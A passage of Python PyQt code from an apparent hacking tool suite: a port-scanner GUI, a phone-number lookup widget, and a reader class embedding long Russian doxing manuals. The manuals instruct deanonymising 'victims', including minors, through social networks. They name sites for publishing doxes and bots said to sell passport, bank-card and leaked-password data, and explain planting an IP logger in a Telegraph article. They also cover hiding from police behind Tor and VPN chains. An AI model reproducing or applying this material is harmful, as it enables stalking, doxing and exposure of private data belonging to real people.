        self.output_field = QTextEdit(self)
        self.output_field.setReadOnly(True)
        self.output_field.setFont(input_font)
        self.output_field.setPlaceholderText(
            "Результаты сканирования появятся здесь..."
        )
        self.output_field.setStyleSheet(output_style)

        layout = QVBoxLayout()
        layout.addWidget(self.label_host)
        layout.addWidget(self.input_host)
        layout.addWidget(self.label_ports)
        layout.addWidget(self.start_port)
        layout.addWidget(self.end_port)
        layout.addWidget(self.scan_button)
        layout.addWidget(self.output_field)
        self.setLayout(layout)

    def start_scan(self):
        """Функция для запуска сканирования портов."""
        host = self.input_host.text()
        start_port = self.start_port.value()
        end_port = self.end_port.value()

        if not host:
            self.output_field.setPlainText("Пожалуйста, введите хост или IP-адрес.")
            return

        self.output_field.setPlainText(
            f"Сканирование хоста: {host}\nПорты: {start_port}-{end_port}\n"
        )

        self.open_ports = []

        self.scan_thread = PortScannerThread(host, start_port, end_port)
        self.scan_thread.progress.connect(self.update_output)
        self.scan_thread.finished.connect(
            self.show_open_ports
        )
        self.scan_thread.start()

    def update_output(self, message):
        """Обновляет поле вывода."""
        self.output_field.append(message)

    def show_open_ports(self, open_ports):
        """Отображает список открытых портов после завершения сканирования."""
        if open_ports:
            self.output_field.append("\nОткрытые порты:")
            for port in open_ports:
                self.output_field.append(f"- Порт {port}")
        else:
            self.output_field.append("\nНет открытых портов.")


class PhoneSearcher(QWidget):
    def __init__(self):
        super().__init__()
        self.init_ui()

    def init_ui(self):
        self.setWindowTitle("Phone_Cearcher by Endscape")
        self.setWindowIcon(QIcon("icon.ico"))
        self.setGeometry(100, 100, 400, 300)

        self.setStyleSheet(background)

        self.input_label = QLabel("📱 Введите номер телефона (с кодом страны):", self)
        self.input_label.setFont(QFont("Arial", 14))
        self.input_label.setStyleSheet("font-size: 14px; font-weight: bold;")

        self.input_field = QLineEdit(self)
        self.input_field.setFont(QFont("Arial", 14))
        self.input_field.setPlaceholderText("Например, +14155552671")
        self.input_field.setStyleSheet(text_input_style)

        self.search_button = QPushButton("🔍 Поиск", self)
        self.search_button.setFont(QFont("Arial", 16))
        self.search_button.clicked.connect(self.search_phone_number)
        self.search_button.setFixedHeight(50)
        self.search_button.setStyleSheet(button_style)

        self.result_label = QLabel("", self)
        self.result_label.setFont(QFont("Arial", 12))
        self.result_label.setWordWrap(True)
        self.result_label.setStyleSheet("font-size: 12px; color: #FFAAAA;")

        layout = QVBoxLayout()
        layout.addWidget(self.input_label)
        layout.addWidget(self.input_field)
        layout.addWidget(self.search_button)
        layout.addWidget(self.result_label)
        self.setLayout(layout)

    def search_phone_number(self):
        phone_number = self.input_field.text().strip()

        if not phone_number:
            QMessageBox.warning(self, "Ошибка", "Пожалуйста, введите номер телефона.")
            return

        try:
            parsed_number = phonenumbers.parse(phone_number)

            country = geocoder.description_for_number(parsed_number, "ru")
            operator = carrier.name_for_number(parsed_number, "ru")
            is_valid = phonenumbers.is_valid_number(parsed_number)
            is_possible = phonenumbers.is_possible_number(parsed_number)

            result = f"Информация по номеру {phone_number}:\n"
            result += f"Страна: {country or 'Неизвестно'}\n"
            result += f"Оператор: {operator or 'Неизвестно'}\n"
            result += f"Номер действителен: {'Да' if is_valid else 'Нет'}\n"
            result += f"Номер возможен: {'Да' if is_possible else 'Нет'}"

            self.result_label.setText(result)
        except Exception as e:
            QMessageBox.critical(self, "Ошибка", f"Не удалось обработать номер: {e}")


class Manual_Reader(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Manuals_Reader by Endscape")
        self.setWindowIcon(QIcon("icon.ico"))
        self.setGeometry(200, 200, 400, 300)
        self.setStyleSheet(background)
        self.reading_mode = False

        self.books = {
            "Деанон": 'I - BASE \n\nБазовый уровень \nПасты, для публикации деанонимизаций \nghostbin.co \n \npastebin.co \n \ndoxbin.org \n \npaste4btc.com \n \npastebin.com \n \ndoxbinmxoyrb4x7f.onion \n--- \nЧастные группы вк, репост в основную группу вк, удаление поста в частной группе вк \n \nСтатьи Telegram \n \nПоверхостный поиск информации по социальным сетям(VK,OK,Facebook) \n \nVK \nЧтобы найти такую информацию, как ФИО, Дата рождения и Учебное заведение: \n \nПриступим. Заходим на страницу жертвы, жмем вкладку "Друзья", идем в адресную строку, видим после "friends" цифры. Копируем. \n \nСразу предупреждаю, это не работает на юзеров с id начинающимся на 440 и далее. \n \nЗаходим сразу на Google и Яндекс. Вбиваем данные цифры и добавляем в их начало "id". Здесь пути расходятся: может выбить много результатов, чекаем их все и собираем информацию (Может выбить имя при регистрации ВК (Как напрямую, так и через сторонние ресурсы типа VKFaces), телефон, канал, группы). Но может произойти так, что не будет найдено ни одного результата. Идем на страницу юзера и смотрим дату рождения. 87% пользователей указывают дату рождения (без года, но его легко вычислить). Идем в друзья. Выбираем город (Может выбить Москву, Санкт-Петербург (Юзер действительно может находиться в данных городах)), чекаем 3 город после Москвы и Питера (если меньше 10 человек чекаем 220vk.com, проверяем скрытых если есть, сравниваем их, либо же проверяем города выше). Итак, люди найдены. Смотрим их даты рождения, а заодно и школы. Каких годов оказалось больше, того же года и юзер, которого мы раскрываем. Идем на OK.RU. Вбиваем имя юзера. Выбираем город. Может быть не найдено ничего. Значит чекаем по дате рождения, выбивает 100% результат. Получаем ФИ, и в 50% случаев и отчество за счет чека друзей и наличия отца. Если отца нет, ищем его вручную. Как? Добавляем к 18 годам возраст раскрываемого юзера, например: юзеру 14 лет, значит отцу 14+18=от 32 лет. Ищем по заданным критериям, получаем 100% результат. \n \nЕсли вы сомневаетесь в том, является та, или иная страница альтом человека, нужно уметь сопоставлять информацию. Расскажу вкратце: вы просто анализируете его онлайн. Если человек заходит с телефона, проверяем его лог-ин\'ы через телфон в углу справа. Например, недавно я деанонил Дениса Ильина и не мог определить его фамилию, т.к. людей с именем Денис и одной и той же датой рождения было двое. Я зашел ко всем на страницы и смотрел онлайн. Денис Тестовик (основа деанонимизируемого) был онлайн почти все время с телефона, один подозреваемый был параллельно с телефона, а это взаимоисключающий фактор. Оставалась страница второго подозреваемого, с которой заходили с периодичностью в 3-5 часов, что говорит о том, что это и был деанонимизируемый. \n \nСервисы: \nhttps://vk.com/app7183114 \n@InfoVkUser_bot  \n@FindNameVk_bot \n@GetPhone_bot  \n220vk.com \nhttps://online-vk.ru/pivatfriends.php?id=123456789 Заменить айди(Друзья закрытого аккаунта) \n \nOdnoklassniki \nТо же, что и VK \n⁣⁣Как узнать номер телефона аккаунта ВК через Одноклассники \n \nСписок способов поиска в социальных сетях: \n \n1. Имя (без фамилии) + город (районный центр/поселок/село) + дата рождения (число) \n \n2. ИФ + город (путем отсеивания результатов) \n \n3. Город (районный центр) + полная дата рождения \n \n4. Поиск родственников по фамилии (если известен возраст, в фильтрах ставим возраст ОТ по арифметической формуле 18+{полный возраст жертвы}), далее поиск в друзьях странных имен, ников (если не удается найти старые страницы по настоящим данным) \n \n5. Идентификатор канала на YouTube в Google (позволяет узнать старое название канала) \n \n[1] В ВК добавьте аккаунт в друзья \n \n[2] Перейдите в Одноклассники и откройте раздел мои друзья \n \n[3] Нажмите на кнопку \'добавить друзей из ВК\' \n \n[4] Если аккаунт нашелся, то скопируйте ссылку на найденный аккаунт ОК \n \n[5] Перейдите по этой ссылке (https://ok.ru/password/recovery) и выберите восстановить через профиль \n \n[6] Вставьте в поле ссылку которую вы скопировали на профиль и нажмите искать \n \nВ результате вы получите часть номера телефона и e-mail адреса \n \nСервисы: \nok.city4me.com \n Если вы узнали Facebook ID через сервисы по типу lampyre.io, нужно узнать по этому ID страницу.Об этом писалось на одноименном посте на стаковерфлоу. \nСсылка - https://stackoverflow.com/questions/12827775/facebook-user-url-by-id \nСервисы: graph.tips \nwhopostedwhat.com \nlookup-id.com (Узнать айди аккаунта фейсбук) \n \nТак же можно искать ID аккаунта в гугл, тем самым получив больше зацепок. \n@usersbox_bot (Найдет аккаунты VK, у которых указан данный Facebook) \n \nhttps://facebook.com/browse/mutual_friends/?uid=USERID&node=USERID — найдет общих друзей, которые имеют общедоступные списки друзей, если у одного из искомых пользователей есть общедоступный список друзей, замените USERID на ID аккаунта \n \nМультисервисы для поиска информации по различным данным \nhttps://thatsthem.com \n \nhttps://www.spokeo.com \n \nhttps://pipl.com \n \nhttps://nuga.app/ \n \nhttps://www.fastpeoplesearch.com \n \nhttps://www.truepeoplesearch.com \n \nhttps://www.familytreenow.com \n \nhttps://socialcatfish.com/ \n \nhttps://usersearch.org/ \n \nhttps://lampyre.io/ \n \nhttps://dehashed.com/ \n \nПолучение информации с почты/номера телефона \nПроизводить пробив по почте можно также при помощи так называемого Google Dorks. Проще говорят это правильный и целенаправленный запрос в поисковике Google \n \n“@example.com” site:example.com — находит почтовые ящики на определенном домене. \n \nHR “email” site:example.com filetype:csv | filetype:xls | filetype:xlsx — находит контакты HR в формате xls, xlsx и csv на определенном домене. \n \nsite:example.com intext:@gmail.com filetype:xls — вытаскивает ID электронных почтовых ящиков (в данном случае Gmail) из определенного домена. \n \nКак я уже говорил правильно сформированный запрос в гугл может выдать крайне много полезной информации. Нужно лишь уметь пользоваться данным инструментом. \n \nПробив по почте \n \nhttps://haveibeenpwned.com/ \n \nhttps://ghostproject.fr \n \nСервис, который показывает пароли к взломанным e-mail https://intelx.io/ \n \nТаблица почта-пароль https://drive.google.com/open?id=1yDi7mjE50f3vCRt0GB-QlnR01uM5gTRz \n \nЕсть ресурс (https://www.exploit-db.com/google-hacking-database) , который собрал в себе огромный список этих запросов и что с их помощью можно получить. Там не только пробив информации. Имеющиеся там примеры запросов помогут найти также слитые пароли, незащищенные документы и базы, различные устройства к которым можно подключиться и т.д. \n \nТак же есть сервис fth.su, где имеется база сервиса leakcheck, (ну и майнкрафт ники) \n \nОчень полезный сервис —lampyre.io \n \nhttps://nuga.app/ - Поиск Instagram аккаунта по номеру телефона. \n \nhttps://mirror.bullshit.agency - Поиск обьявлений на досках обьявлений по номеру телефона. \n \nhttps://nomer.org - одна из баз данных адресов \n \nОшибка <h1>503 Bad Gateway</h1> на DonatePay/DonationAlerts - если пользователь использует донат-сервисы, вы можете попытаться узнать его номер сделав ошибку через просмотр кода элемента на странице оплаты. Работает по сей день. \n \nhttp://com.lullar.com \n \nhttp://www.emailfinder.com \n \nhttp://www.spokeo.com/email-search \n \nhttp://ctrlq.org/google/images/ \n \nhttp://emailchange.com/ \n \nПравильное использование поисковиков для поиска информации \nhttps://www.rush-analytics.ru/blog/seo-gid-po-poiskovym-operatoram-google \n \nБольшое количество вспомогательных сервисов \nТрекеры это инструмент сбора данных о пользователях для аналитики. Используются на сайтах и в приложениях. Каждый трекер имеет свой уникальный номер который укзан в исходном коде веб страницы. Пример: UA-123456789 — трекер Google Analytics. \n \nshodan.io — найдет IP адреса и сайты с упоминанием кода трекера \n2. spyonweb.com — поиск сайтов по трекерам pub, UA \n \n3. intelx.io (https://intelx.io/tools?tab=analytics) — найдет сайты с искомым трекером UA, 6 источников поиска \n \nПоиск через URL \nwww.shodan.io/search?query=http.html%3AUA-12345678-1 — найдет сайты с таким же трекером, замените UA-12345678-1 на свой код трекера \nПрочее\n\n\nII HARD\n\nПрофессиональный уровень \nМощнейший пробив селлер \nНайдет то, что не найдут люди в погонах за шекели \n \nhttps://rutor.wtf/forums/detektiv-kolombo-probiv-po-vsem-strukturam.177/ \n \nPhone Infogra \nМощный инструмент для пробива информации по номеру(мультисервисы) \n \nhttps://github.com/sundowndev/PhoneInfoga \n \nSherlock \nСамый мощный известный мне инструмент по пробиву ника \n \nhttps://github.com/sherlock-project/sherlock \n \nPhoton \nОчень сильный кравлер(Выгрузка информации с сайтов) \n \nhttps://github.com/s0md3v/Photon \n \nБиблия пентестера \nКрупнейший сборник информации по пентесту, что тебе пригодится в будущем.Информация на английском, и информации настолько дохуя, что эге по английскому языку ты сдашь на нехуй делать. \n \nhttps://github.com/blaCCkHatHacEEkr/PENTESTING-BIBLE \n \nЕсли же тебе это нахуй не интересно, держи материал с этой библии для OSINT \n \n4500 гугл дорков — https://sguru.org/ghdb-download-list-4500-google-dorks-free/ \n \nOSINT Ресурсы 2019 — https://medium.com/p/b15d55187c3f \n \nOSINT Тулкит — https://medium.com/@micallst/osint-resources-for-2019-b15d55187c3f \n \nВизуализация информации OSINT — https://medium.com/hackernoon/osint-tool-for-visualizing-relationships-between-domains-ips-and-email-addresses-94377aa1f20a \n \nInstagram OSINT — https://medium.com/secjuice/what-a-nice-picture-instagram-osint-8f4c7edfbcc6 \n \nНаилучший сборник OSINT \nhttps://github.com/jivoi/awesome-osint \n \nСЛОЖНЕЙШИЙ ИНСТРУМЕНТ SPIDERFOOT(Lampyre Lighthouse на стероидах) \nhttps://github.com/smicallef/spiderfoot \n \nДля тебя это будет заданием — поставить эту хуету, и подключить все бесплатные API \n \nОбщий OSINT GitHub топик \nhttps://github.com/topics/osint \n \nIP Logger в Telegraph \nБерешь, заходишь на сайт IPLOGGER и выбираешь Invisible Image \n \nПрофессиональный уровень, изображение №1 \nПолучаешь ссылку, заходишь в статью Telegraph, нажимаешь кнопку «вставить код» \n \nПрофессиональный уровень, изображение №2 \nВставляешь свою ссылку на IpLogger \n \nПрофессиональный уровень, изображение №3 \nИ дописываешь .jpg \n \nПрофессиональный уровень, изображение №4 \nВот и все \nСсылка на статью с логгером — https://telegra.ph/dfdgdfg-07-18 \n \nПАЩ \n \nhttps://book.cyberyozh.com/ru/?fl=ru - Курс по интернет безопаности \n \nГениальная поебота для шифровки файлов - https://www.aescrypt.com/ (Шифруешь все важное и тд(на курсе кибережа есть гайд, вроде 56 пункт) \n \nУ тебя уже есть батник, который добавляет в firewall все трекеры майкрософт, т.е мы исключаем возможности подрыва нашей будущей связки WIFI-PC`Сервера Microsoft`TOR~ Советую: Не использовать микрофон Не палить свои личные данные НИКОМУ(вот у мя есть на тя инфа могу ебнуть как муху и все) Не использовать антивирус и прочее В качестве браузера советую выбрать Mozilla Firefox с адоннами c Level Midle Сообственно говоря, перейдем к самой связке Как пустить весь трафик через Tor \n \nСуществует несколько способов решить эту проблему. Мы можем использовать Tor Bundle, о котором мы писали в статье «Запуск Tor автоматический». Но используя этот способ вы можете столкнуться с проблемой деанонимизации. Трафик который не поддерживает Tor может попросту выбежать и попасть в сеть в в открытом виде, тем самым засветив ваш IP. \n \nВторой способ — это использовать специальные программы. Об одной из них и пойдет речь в следующей главе. \n \nПеренаправление трафика в Tallow \nTallow (TorWall) — прозрачный брандмауэр Tor и прокси-решение для Windows. Вкратце, когда вы запустите Тэлоу: \n \nВесь трафик с вашего ПК прозрачно перенаправляется через сеть анонимности Tor. Программу не нужно настраивать для использования Tor. \nВсе не связанные с Tor-трафик, такие как UDP, блокируются. Сюда входит и DNS-трафик, который помогает уменьшить утечки. \nУ Tallow есть несколько преимуществ: \n \nВо-первых, весь не Tor трафик блокируется и не может покинуть ваш компьютер. Это защищает от некоторых уязвимостей, таких как «утечка DNS». \n \nВо-вторых, Tallow прозрачен. Это означает, что ваши приложения и программы не будут знать, что трафик перенаправляется через Tor.\n\nПоэтому вы можете использовать свой предпочтительный веб-браузер или любую другую программу, которая подключается через Интернет, с нулевой конфигурацией. \n \nНо будьте осторожны! В отличие от Tor Browser Bundle, Tallow не анонимизирует контент, отправленный через сеть Tor. Например куки или другая информация, которая может идентифицировать вас. \n \nСкачать Tallow \nСначала загрузите Tallow. Скачать приложение можно с официального сайта по этой прямой ссылке. Программа имеет две версии: обычную и портабельную (версия которая не требует установки). \n \nРаботает на операционных системах: Windows Vista, Windows 7, Windows 8, Windows 10, MacOSX, Linux. \n \nТакже программу можно скачать с репозитория на GitHub: \n \nУстановка Tallow \nС установкой на Windows все просто. Просто запускаете файл и дождитесь конца установки. \n \nИспользование Tallow \nИспользовать Tallow также просто как и устанавливать. Нажмите большую кнопку «Tor», чтобы начать перенаправление трафика через сеть Tor. \n \nСоздать карусель Tallow Добавьте описание \n \nНажмите кнопку «Tor» еще раз, чтобы остановить работу Тэлоу и вернуть подключение к Интернету, в прежнее состояние. \n \nИмейте ввиду во время включения и отключения программы подключения к сети будет прерываться! \n \nНастройка Tallow \nКак вы видите на скрине. В программе имеется две настройки: \n \nForce web-only — блокирует весь трафик, не относящийся к сети (порт HTTP 80, HTTPS-порт 443) \nForce SOCKS4a — блокирует прямые подключения к IP-адресам через Tor. \nДополнительные настройки Tallow \nДля продвинутых пользователей есть возможность изменить некоторые настройки редактируя разные файлы. Например: \n \nИспользуя командную строку можете настроить вывод отладки запустив файл tallow.exe. \nИзменив файл hosts.deny, вы сможете изменить домены которые блокируются через Tor. \nОтредактировав файл traffic.deny, контролировать, какие типы трафика блокируются через Tor. \nИзменив файл torrc для настройки Tor. \nЗаменив файл tor.exe на обновить версию. \nТ,Е у нас теперь весь трафик ебашит через Tor (Enternet-PC-TOR-Resource), вроде ты уже ебать анонимный, но всю эту поебень ментам легко обойти и харкануть те в личико, т.к могут быть трекеры с обратной стороны, и простым сопоставлением тебя найдут и разобьют ебало \nЧто-бы решить эту проблему, достаточно гнать траф через 3 сторону, и мы заюзаем ахуенный впн Mullvad - https://mullvad.net/ru/  \nСтоит эта поебота 5 бачей, что для обычного русского - дохуя, но его можно юзать на 3 устройствах, следовательно, и скидыватся в 3 ебала. \nПросто качаешь, покупаешь, получаешь ключ, вводишь ключ, и развлекаешься. \nТеперь у нас трафик идет PC-TOR-VPN-RESOURCE, что уже блатняк, и разомкнуть такую цепочку будет дорого и нудно, но мы в рот ебали и лучше спараноить, чем потом жалеть. \nПросто юзай за основу браузера для своих темных делишек тор, а в телеграме пропускай трафик через Tor, в итоге у нас выходит такая цепь ебанная PC-Tor-VPN-Tor просто 10/10 не найдут и не отпиздят. \nКак пропускать траф в телеге через тор писал мой знакомый пидараска - https://vk.com/@sterbentodd-delaem-telegram-anonimnee . \nА, ну и еще, если ты уже допускал бреши в анонимности, то ты пиздуешь переустанавливать винду и выполнять все пункты сверху, если ты хочешь добится своей желанной анонимности на винде.Т.к я уверен, что у тебя остались бреши ввиде реальных данных, заходов с твоего айпи, дохуя+ аккаунтов и паролей, т.д.\n\n\n\nIII BOTS\n\n@scugotityc24552925bot - Глаз бога. Интересный бот, если ваш соперник бесполезное животное без анонимности, то вам сюда.\n\n@HimeraSearchBot - Химера. Интересный бот, но платный. Можете закинуть хоть рублей 200, указав пункт по которому будет пробиваться ваш соперник, и большой шанс выдачи практически всего деанона буквально за 100 рублей.\n\n@Smart_SearchBot - Бот который с помощью фотографии может найти информации о том или ином человеке.\n\nПоиск фотографии в социальных сетях\n\nhttps://vk.watch/\nhttps://findclone.ru/\nhttps://pimeyes.com/en/\nhttps://search4faces.com/ \n\n@cryptoscanning_bot \n@protestchat_bot \n@joinchatru_bot \n@deanonym_bot \n@GetCont_bot \n@Checnum_bot \n@EyeGoodBot \n@Tpoisk_Bot \n@LBSE_bot\n\n@MyGenisBot — находит имя и фамилию владельца номера\naccount.lampyre.io— программа выполняет поиск аккаунтов, паролей и многих других данных\n@usersbox_bot — бот найдет аккаунты в ВК у которых в поле номера телефона указан искомый номер\n@GetPhone_bot — вытаскивает номера телефона из утекших баз\n@clerkinfobot — берет данные из приложения getcontact, показывает как записан номер телефона в контактах\n@GetFb_bot — дает ссылку на Facebook аккаунт\n\n\nПоиск по EMAIL\n\nintelx.io — многофункциональный поисковик, поиск осуществляется еще и по даркнету\n@mailsearchbot — ищет по базе, дает часть пароля\n@info_baza_bot — покажет из какой базы слита почта, 2 бесплатных скана\neakedsource.ru — покажет в каких базах слита почта\nmostwantedhf.info — найдет аккаунт skype\nemail2phonenumber (https://github.com/martinvigo/email2phonenumber) (t) — автоматически собирает данные со страниц восстановления аккаунта, и находит номер телефона\nspiderfoot.net (r) — автоматический поиск с использованием огромного количества методов, можно использовать в облаке если пройти регистрацию\neversegenie.com — найдет местоположение, Первую букву имени и номера телефонов\n@last4mailbot — бот найдет последние 4 цифры номера телефона клиента Сбербанка\nsearchmy.bio — найдет учетную запись Instagram с электронной почтой в описании\nleakprobe.net — найдет ник и источник слитой базы \nrecon.secapps.com — автоматический поиск и создание карт взаимосвязей\n@AvinfoBot — найдет аккаунт в ВК\n\n\n\n\nОфициальная первая часть мануала закончена. Теперь ты можешь спокойно трахать того или иного человека, зная о нем капли информации. Помни, что злоупотребление может привести к ебанному даунизму, но не суть.\n',
            "Деанон 2": 'private manual \n\n\n├ Quick OSINT — найдет оператора, email, как владелец записан в контактах, базах данных и досках объявлений, аккаунты в соц. сетях и мессенджерах, в каких чатах состоит, документы, адреса и многое другое\n├ @clerkinfobot — бот берет данные из приложения getcontact, показывает как записан номер телефона в контактах\n├ @dosie_Bot — как и в боте uabaza дает информацио о паспорте только польностью, 3 бесплатные попытки\n├ @find_caller_bot — найдет ФИО владельца номера телефона\n├ @get_caller_bot — поиск по утечкам персональных данных и записным книгам абонентов, может найти ФИО, дату рождения, e-mail\n├ @get_kolesa_bot — найдет объявления на колеса.кз\n├ @get_kontakt_bot — найдет как записан номер в контактах, дает результаты что и getcontact\n├ @getbank_bot — дает номер карты и полное ФИО клиента банка\n├ @GetFb_bot — бот находит Facebook\n├ @Getphonetestbot — бот берет данные из приложения getcontact, показывает как записан номер телефона в контактах\n├ @info_baza_bot — поиск в базе данных\n├ @mailsearchbot — найдет часть пароля\n├ @MyGenisBot — найдет имя и фамилию владельца номера\n├ @phone_avito_bot — найдет аккаунт на Авито\n├ @SafeCallsBot — бесплатные анонимные звонки на любой номер телефона с подменой Caller ID\n└ @usersbox_bot — бот найдет аккаунты в ВК у которых в поле номера телефона указан искомый номер\n\n\nТелефон\nL Поиск по номеру телефона\n[!] Содержимое раздела:\n\n\n• Lampyre (https://account.lampyre.io/email-and-phone-lookup) — веб\nверсия поиска по любому номеру телефона, поиск по аккаунтам и телефонной книге - от себя: полезная вещь в osint-сфере, не раз спасала меня.\n• Getcontact (https://getcontact.com/) — найдет информацию о том как записан номер в контактах - от себя: Сайт хороший, но я думаю, что бот в телеграмме будет на много удобнее для Вас.\n• Truecaller (https://www.truecaller.com/) — телефонная книга, найдет имя и оператора телефона - от себя: Вещь годная, но долго возиться\n• Bullshit (https://mirror.bullshit.agency/) — поиск объявлений по номеру телефона - Иногда нужен VPN\n• @numberPhoneBot (https://t.me/@numberPhoneBot) — найдет адрес и ФИО, не всегда находит\n• Spravnik (https://spravnik.com/) — поиск по городскому номеру телефона, найдет ФИО и адрес\n• @info_baza_bot (https://t.me/@info_baza_bot) — поиск в базе данных\n• @find_caller_bot (https://t.me/@find_caller_bot) — найдет ФИО владельца номера телефона\n• @usersbox_bot (https://t.me/@usersbox_bot) — бот найдет аккаунты в ВК у которых в поле номера телефона указан искомый номер\n• @getbank_bot (https://t.me/@getbank_bot) — дает номер карты и полное ФИО клиента банка\n• @eyegodsbot - Телеграмм бот, часто радовал меня, есть бесплатные пробивы по машинам, лицу, номеру телефона, есть платный контент.\n• @egrul_bot - Пробивает конторы/ИП, по вводу ФИО/фирмы предоставляет ИНН объекта; учредителей бизнеса/партнеров и отчет налоговую декларацию. И наоборот: поиск по ИНН выдаст ФИО/конторы. Базы данных сами понимаете откуда. Ограничений бота – нет.\n• @mnp_bot \n• @xinitbot \n• @black_triangle_tg \n\n\n            Не слитые приват боты\n————————————————\n@ZumPaster_bot\n@BlackatSearchBot\n\n\n\n\n mysmsbox.ru — определяет чей номер, поиск в Instagram, VK, OK, FB, Twitter, поиск объявлений на Авито, Юла, Из рук в руки, а так же найдет аккаунты в мессенджерах\n\n\n@mailsearchbot - По запросу пробива e-mail бот выдает открытый «password» от ящика. Очень огромная/крутая БД\n\n\nНекоторые полезные инструменты доксинга\n\n\nwww.whois.net\n\n\nwww.pipl.com\n\n\nwww.tineye.com\n\nПасты, для публикации деанонимизаций :\n\n\nghostbin.co \ndoxbin.org \ndoxbinmxoyrb4x7f.onion\n\n\n\n\n\n\n ДЕАНОНИМИЗАЦИЯ ПО TELEGRAM \\\\\n\n\nСамым распространенным способом деанонимизации пользователя Telegram является установление номера мобильного телефона, привязанного к его аккаунту. К сожалению, этот метод становится все менее эффективным.\n\n\n@deanonym_bot\n@FavTgFindbot\nhttps://anonimov.net/\n@addprivategroup_bot \n@cryptoscanning_bot, \n@protestchat_bot \n@joinchatru_bot \n@deanonym_bot \n@GetCont_bot \n@Checnum_bot \n@EyeGoodBot \n@Tpoisk_Bot \n@LBSE_bot\n\n\n\n\n@Smart_SearchBot - Помогает найти дополнительную информацию, относительно телефонного номера, id ВКонтакте, email, или ИНН юр./физ. лица.\n@Getcontact_Officalbot – показывает как номер телефона записан в контактах других людей\n@info_baza_bot – база данных номеров телефона, email\n@get_caller_bot - Ищет только по номеру телефона. На выходе: ФИО, дата рождения, почта и «ВКонтакте»\n@OpenDataUABot – по коду ЕДРПОУ возвращает данные о компании из реестра, по ФИО — наличие регистрации ФОП\n@YouControlBot - полное досье на каждую компанию Украины\n@mailseatchbot - По запросу пробива e-mail выдает открытый пароль от ящика если тот есть в базе\n@Dosie_Bot – создатели «Досье» пошли дальше и по номеру телефона отдают ИНН и номер паспорта\n@UAfindbot – База данных Украины\nNNB - @The_NoNameBot (дает полезную инфу) \n\n\nhttps://eyeofgod.space/ (Актуальный глаз бога искать здесь, ибо его вечно банят) \n\n\n@EmailPhoneOSINT_bot - Получаем ФИ, почту, регион \n\n\n@phone_avito_bot - проверяем авито акич\n\n\n@getcontact_real_bot - работу гет контакта, знаете\n\n\n@usinfobot - получаем тг айди \n\n\n@TgAnalyst_bot - если акич попал в бд телеграмма, выдаст айпи, номер, девайс\n\n\n@UniversalSearchBot - по мануалу который даст бот после пробива по номеру, узнаете вк аву\n\n\nLBSG.net, Collection 1, StockX.com, 8Tracks.com, Wishbone.io, DailyQuiz.me, Zynga.com, Wattpad.com\n\n\ndatabases.today — архив баз банков, сайтов, приложений\n\n\n@basetelega — утечки, компании, парсинг открытых источников\n\n\nebaza.pro (r) — есть email, телефонные номера, физ. лица, предприятия, базы доменов и другие\n\n\nhub.opengovdata.ru — Российские базы статистики, росстата, архивы сайтов, финансы, индикаторы, федеральные органы власти, суды и т.д\n\n\n@freedomf0x — утечки сайтов, приложений, гос. структур\n@leaks_db — агрегатор публичных утечек\n@BreachedData — утечки сайтов, приложений, соц. сетей, форумов и т.д.\n@opendataleaks — дампы сайтов школ, судов, институтов, форумов по всему миру\n@fuckeddb — дампы сайтов, приложений, социальных сетей, школ, судов, институтов, государственных ресурсов, форумов по всему миру\n@gzdata — китайские сайты и приложения \n\n\nAVinfoBot (r) – делает отчет где есть данные из социальных сетей, недвижимости, автомобилей, объявлений и телефонных книжек. Нужно пригласить другой аккаунт для отчета\ngetcontact.com (r) — выдает информацию о том как записан номер в контактах\ntruecaller.com (r) — телефонная книга, ищет имя и оператора телефона\navinfo.guru (r) — проверка телефона владельца авто, иногда нужен VPN\nspravnik.com — поиск по городскому номеру телефона, найдет ФИО и адрес\nm.ok.ru — показывает часть номера телефона, email, фамилии и полностью город с датой регистрации, используй во вкладке инкогнито\nsmartsearchbot.com — бот находит ФИО, email, объявления, бесплатный поиск не доступен для новых пользователей\nlist-org.com — найдет организацию в РФ\nodyssey-search.info (r) — сыщит ФИО, объявления Avito, автомобили, документы, места работы, контакты, а при регистрации можно указать любую российскую организацию\nfind-org.com — найдет компанию в РФ\n\n\n@FindClonesBot – Поиск человека по фото\n@MsisdnInfoBot - Получение сведений о номере телефона\n@AVinfoBot - Поиск сведений об автовладельце России\n@antiparkon_bot - Поиск сведений об автовладельце\n@friendsfindbot - Поиск человека по местоположению\n@egrul_bot - Пробивает конторы/ИП, по вводу ФИО/фирмы предоставляет ИНН объекта России\n@last4mailbot (Mail2Phone) — по почте показывает статус: есть ли аккаунт в «Одноклассниках» и «Сбербанке», или нет.\n@bmi_np_bot - По номеру телефона определяет регион и оператора.\n@whoisdombot - пробивает всю основную информацию о нужном домене (адрес сайта), IP и другое.\n@getfb_bot - По запрашиваемому номеру телефона выдает ссылку на личность в FaceBook.\n\n\n\n\nДЕАНОНИМИЗАЦИЯ ПО VK ПРОФИЛЮ \\\\\nКак бы это смешно ну звучало, но в основном для того, чтобы узнать профиль жертвы, стоит использовать приложение\nот сообщества BAGOSI "InfoApp". Советуем проматривать вниматильно все коментарии, и просматривать посты/страницы\nгде жертва оставляла коментарии. Также лучшего всего просматривать упоминания жертвы (т.е посты, коментарии, где был упомянен профиль жертвы)\nСсылка - https://vk.com/feed?obj=IDЖертвыВЦифрах&section=mentions (Работает только с PC или же с браузера). Если страница жертвы довольно старая,\nи открытая, либо же жертва у вас в друзьях, стоит проверить активность его профиля на 220vk.com. При известности города жертвы, вы сможете найти его одноклассников \nиспользуя функцию 220вк "Города друзей", данная функция рассортирует всех друзей жертвы по городам. Также используя фунцию "Скрытые друзья" вы можете найти его родных/одноклассников/друзей из реальной жизни.\nДля простого просмотра старых имён, вы можете вбить цифровой ID жертвы в Яндекс. \n\n\n ИНФОРМАЦИЯ ПО ИГРОВОМУ НИКНЕЙМУ ЖЕРТВЫ \\\\ \nИмея ник жертвы, уже можно найти его информацию. Самый первый, хоть и старенький, но очень эффективный способ это вбить в Yandex "intext:nicnkname". \nДанный способ поможет найти все упоминания по интернету с данным ником. После чего, стоит зайти в группы где играла жертва, (аннализируем через коментарии и упоминания) и вбиваем этот ник в эти сообщества. \nТем самым мы вероятно найдём основную страницу жертву, или же дальнейшую информацию. Также можно проверить информацию по базам серверов Minecraft PE, но данные базы можно приобрести в ЛС нашей группы.\nТакже вбиваем никнейм в YouTube, предварительно выбрав сортировку поиска "только каналы". \n\n\n\n\n \\\\ ПОИСК ИНФОРМАЦИИ ПО РЕАЛЬНОМУ Ф.И.О \\\\\nПри известности такой информации о жертве стоит посеить каждую Соц. Сеть и проверить есть ли там такой "Иван Иванов" проживающий в "Москве".\nИзначально советуем вам искать информацию в каждой 